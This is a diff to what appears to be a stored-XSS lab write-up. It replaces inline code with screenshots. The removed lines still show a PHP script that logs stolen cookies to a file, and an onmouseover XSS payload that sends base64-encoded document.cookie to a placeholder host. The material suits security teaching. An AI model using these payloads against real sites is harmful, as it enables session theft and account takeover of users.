@@ -107,17 +107,7 @@ Check “Share” functionality for stored XSS execution
 
 Save as log.php on your server:
 
-<pre><?php
-$logFile = "cookieLog.txt";
-$cookie = $_REQUEST["c"];
-
-$handle = fopen($logFile, "a");
-fwrite($handle, $cookie . "\n\n");
-fclose($handle);
-
-header("Location: http://www.google.com/");
-exit;
-?></pre>
+<img width="512" height="357" alt="image" src="https://github.com/user-attachments/assets/c1257bf8-71e4-44df-932e-cb81c6cb741d" />
 
 Run PHP server:
 
@@ -132,7 +122,7 @@ Update the Country field with:
 
 Alternative HTTPS-safe payload:
 
-`<h1 onmouseover='document.write(`<img src="https://CUSTOMLINK?cookie=${btoa(document.cookie)}">`)'>test</h1>`
+<img width="1157" height="43" alt="image" src="https://github.com/user-attachments/assets/ee5be4ff-0ebb-4440-9e11-58431fea58c0" />
 
 ## Simulate Victim
 
